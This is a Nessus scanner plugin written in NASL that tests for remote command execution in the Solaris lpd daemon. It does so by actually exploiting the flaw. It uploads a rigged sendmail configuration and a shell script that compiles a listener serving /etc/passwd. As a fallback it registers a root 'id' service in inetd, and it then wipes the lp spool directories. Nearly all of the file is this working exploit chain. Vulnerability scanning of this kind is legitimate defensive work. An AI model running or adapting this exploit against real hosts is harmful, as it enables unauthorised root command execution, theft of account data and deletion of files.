#
# This script was written by Renaud Deraison
#
# See the Nessus Scripts License for details
#
#
# This script attempts to compile a program which will send
# us /etc/passwd. If no compiler is installed on the remote system,
# then it adds a service (id) in inetd.conf, on port 1.
#
# Ref: remorse [http://www.geocities.com/entrelaspiernas/], by ron1n <shellcode@hotmail.com>
#
#


if(description)
{
   script_id(11513);
   script_bugtraq_id(3274);
   script_version ("$Revision: 1.5 $");
  
   name["english"] = "Solaris lpd remote command execution";
  
   script_name(english:name["english"]);
 
   desc["english"] = "
The remote lpd daemon is vulnerable to an
environment error which may allow an attacker
to execute arbitrary commands on this host.

Nessus uses this vulnerability to retrieve the
password file of the remote host although any
command could be executed.

Solution : None at this time. Disable this service.
Risk factor : High";


   script_description(english:desc["english"]);
 
   summary["english"] = "Reads the remote password file, thanks to lpd";
   script_summary(english:summary["english"]);
 
   script_category(ACT_DESTRUCTIVE_ATTACK); # Intrusive?
 
   script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
   script_family(english:"Gain root remotely");
   script_require_ports("Services/lpd", 515);
   script_dependencies("find_service.nes");
 
   exit(0);
}

CTRL = 2;
DATA = 3;
MAGIC_PORT = get_host_open_port();
if(MAGIC_PORT <= 1)MAGIC_PORT = 39876;
else MAGIC_PORT --;

function intro(soc)
{
 send(socket:soc, data:raw_string(0x2));
 send(socket:soc, data:crap(data:"/", length:1010));
 send(socket:soc, data:string("NESSUS\n"));
 ack = recv(socket:soc, length:1);
 if(ack == NULL)exit(0);
}


function xfer(soc, type, buf, dst)
{
 local_var req;
 
 req = raw_string(type) + string(strlen(buf), " ", dst, "\n");
 send(socket:soc, data:req);
 r = recv(socket:soc, length:1);
 if(r == NULL)exit(0);
 send(socket:soc, data:buf);
 send(socket:soc, data:raw_string(0));
 r = recv(socket:soc, length:1);
 if(r == NULL)exit(0);
}



mailcf = "V8

Ou0
Og0
OL0
Oeq
OQ/tmp

FX|/bin/sh /var/spool/lp/tmp/<REPLACEME>/script

S3
S0      
R$+     $#local $@blah $:blah
S1
S2
S4
S5

Mlocal  P=/bin/sh, F=S, S=0, R=0, A=sh /var/spool/lp/tmp/<REPLACEME>/script
Mprog   P=/bin/sh, F=S, S=0, R=0, A=sh /var/spool/lp/tmp/<REPLACEME>/script";



script = '
#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/ucb:/usr/local/bin:/usr/local/sbin:/usr/xpg4/bin:/opt/sfw/bin:/usr/ccs/bin  
export PATH
cd /tmp

where=`which gcc 2>&1 | grep -v "no $1"`
test -n "$where" && CC=gcc
test -z "$CC" && {
	where=`which cc 2>&1 | grep -v "no $1"`
	test -n "$where" && CC=cc
	if [ -z "$CC" ]; then  echo "tcpmux stream tcp nowait root /usr/bin/id id" > ic ; /usr/bin/inetd -s ic; rm ic; exit ; fi
	}
cat > c.c << __EOF__
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
int main(int argc, char **argv)
{
int sd, cd;
int fd;
char buf[4096];
int so = 1;

struct sockaddr_in saddr;
memset(&saddr, 0, sizeof saddr);
saddr.sin_family = AF_INET;
saddr.sin_port = htons(MAGIC_PORT);
saddr.sin_addr.s_addr = htonl(INADDR_ANY);
sd = socket(AF_INET, SOCK_STREAM, 0);
setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &so, sizeof(so));
bind(sd, (struct sockaddr *) &saddr, sizeof saddr);
listen(sd, 1);
cd = accept(sd, NULL, NULL);

fd = open("/etc/passwd", O_RDONLY);
if(fd < 0)write(cd, "exploit worked", strlen("exploit worked"));
else {read(fd, buf, sizeof(buf) - 1);close(fd);}
buf[sizeof(buf) - 1] = 0;
write(cd, buf, strlen(buf));
shutdown(cd, 2);
close(cd);
exit(0);
}
__EOF__

$CC -o c c.c -lsocket
./c &
rm -f c.c c
rm -rf /var/spool/lp/tmp/*
rm -rf /var/spool/lp/requests/*';


control = 
'Hnessus
P\\"-C/var/spool/lp/tmp/<REPLACEME>/mail.cf\\" nobody
fdfA123config
fdfA123script';


script = ereg_replace(string:script, pattern:"MAGIC_PORT", replace:string(MAGIC_PORT));
mailcf  = ereg_replace(string:mailcf, pattern:"<REPLACEME>", replace:this_host_name());
control = ereg_replace(string:control, pattern:"<REPLACEME>", replace:this_host_name());


port = get_kb_item("Services/lpd");
if(!port)port = 515;
if(!get_port_state(port))exit(0);

soc = open_priv_sock_tcp(dport:port);
if(!soc)exit(0);

soc1 = open_priv_sock_tcp(dport:port);
if(!soc1)exit(0);

intro(soc:soc);
xfer(soc:soc, type:CTRL, buf:control, dst:"cfA123nessus");
xfer(soc:soc, type:DATA, buf:mailcf, dst:"mail.cf");
xfer(soc:soc, type:DATA, buf:script, dst:"script");
send(socket:soc, data:raw_string(2) + '!\n');
close(soc);


intro(soc:soc1);
xfer(soc:soc1, type:CTRL, buf:control, dst:"cfA123nessus");
xfer(soc:soc1, type:DATA, buf:mailcf, dst:"dfA123config");
xfer(soc:soc1, type:DATA, buf:script, dst:"dfA123script");
close(soc1);


sleep(10);

soc = open_sock_tcp(MAGIC_PORT);
if(!soc){
 soc = open_sock_tcp(1);
 if(soc){
 	r = recv_line(socket:soc, length:4096);
 	if(egrep(pattern:"uid=[0-9].*gid=[0-9]", string:r))security_hole(port);
	}
  exit(0);
}

r = recv(socket:soc, length:4096);
if(r)
{
 if("exploit worked" >< r )security_hole(515);  # Worked but could not open /etc/passwd...
 else if(egrep(pattern:".*root:.*:0:", string:r))
 {
 report = "The remote lpd daemon is vulnerable to an
environment error which may allow an attacker
to execute arbitrary commands on this host.

We used this vulnerability to retrieve an extract of /etc/passwd  :

" + r + "

Solution : None at this time. Disable this service.
Risk factor : High";

  security_hole(port:515, data:report);
 }
}
